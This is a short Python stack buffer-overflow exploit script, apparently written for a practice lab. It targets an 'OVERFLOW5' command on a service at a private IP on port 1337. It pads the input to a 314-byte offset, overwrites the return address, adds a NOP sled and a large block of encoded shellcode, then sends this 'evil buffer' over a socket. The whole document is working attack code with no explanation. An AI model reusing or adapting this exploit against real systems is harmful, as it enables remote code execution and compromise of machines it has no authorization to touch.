import socket

ip = "192.168.56.101"
port = 1337

prefix = "OVERFLOW5 "
offset = 314
overflow = "A" * offset

#retn = ""
#retn =  "BBBB"

retn =  "\xAF\x11\x50\x62"

padding = "\x90" * 16

payload = (
"\xfc\xbb\x82\xc5\x68\x9d\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x7e\x2d\xe7"
"\x9d\x7e\xae\x98\x14\x9b\x9f\x8a\x43\xe8\xb2\x1a\x07\xbc"
"\x3e\xd0\x45\x54\x30\x51\x23\x72\x7f\x62\x3f\x08\x57\xad"
"\x80\x40\x9b\xac\x7c\x9a\xc8\x0e\xbc\x55\x1d\x4e\xf9\x20"
"\x6b\xbf\x57\xe5\x18\x6d\x48\x82\x5d\xae\x69\x44\xea\x8e"
"\x11\xe1\x2d\x7a\xae\xe8\x7d\xd3\xa5\xb2\x5d\x5f\xf1\x5a"
"\x9f\x8c\x87\x93\xeb\x0e\xc1\xa8\x20\xe4\xe0\x51\x49\x2c"
"\x33\x6d\x8b\x1f\x39\xc1\x0d\x67\x7a\xf9\x7b\x93\x78\x84"
"\x7b\x60\x02\x52\x09\x77\xa4\x11\xa9\x53\x54\xf6\x2c\x17"
"\x5a\xb3\x3b\x7f\x7f\x42\xef\x0b\x7b\xcf\x0e\xdc\x0d\x8b"
"\x34\xf8\x56\x48\x54\x59\x33\x3f\x69\xb9\x9b\xe0\xcf\xb1"
"\x0e\xf7\x70\x3a\xd1\xf8\x2c\xad\x1d\x34\xcf\x2d\x0a\x4f"
"\xbc\x1f\x95\xfb\x2a\x2c\x5e\x25\xac\x25\x48\xd6\x62\x8d"
"\x19\x29\x83\xee\x30\xed\xd7\xbe\x2a\xc4\x57\x55\xab\xe9"
"\x8d\xc0\xa1\x7d\xee\xbd\x8e\x7c\x86\xbf\xee\x6f\x0a\x49"
"\x08\xdf\xe2\x19\x85\x9f\x52\xda\x75\x77\xb9\xd5\xaa\x67"
"\xc2\x3f\xc3\x0d\x2d\x96\xbb\xb9\xd4\xb3\x30\x58\x18\x6e"
"\x3d\x5a\x92\x9b\xc1\x14\x53\xe9\xd1\x40\x04\x11\x2a\x90"
"\xa1\x11\x40\x94\x63\x45\xfc\x96\x52\xa1\xa3\x69\xb1\xb1"
"\xa4\x95\x44\x80\xdf\xa3\xd2\xac\xb7\xcb\x32\x2d\x48\x9d"
"\x58\x2d\x20\x79\x39\x7e\x55\x86\x94\x12\xc6\x12\x17\x43"
"\xba\xb5\x7f\x69\xe5\xf1\xdf\x92\xc0\x82\x18\x6c\x96\xac"
"\x80\x05\x68\xec\x30\xd6\x02\xec\x60\xbe\xd9\xc3\x8f\x0e"
"\x21\xce\xc7\x06\xa8\x9e\xaa\xb7\xad\x8b\x6b\x66\xad\x3f"
"\xb0\x99\xd4\x4f\x47\x5a\x29\x46\x2c\x5a\x29\x67\x52\x66"
"\xff\x51\x20\xa9\xc3\xe6\x2b\x34\xee\x12\xc4\xe1\x7b\x9f"
"\x89\x11\x56\xe3\xb7\x91\x53\x9b\x43\x89\x11\x9e\x08\x0d"
"\xc9\xd2\x01\xf8\xed\x41\x21\x29\xed\x65\xdd\xd2\xee")

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
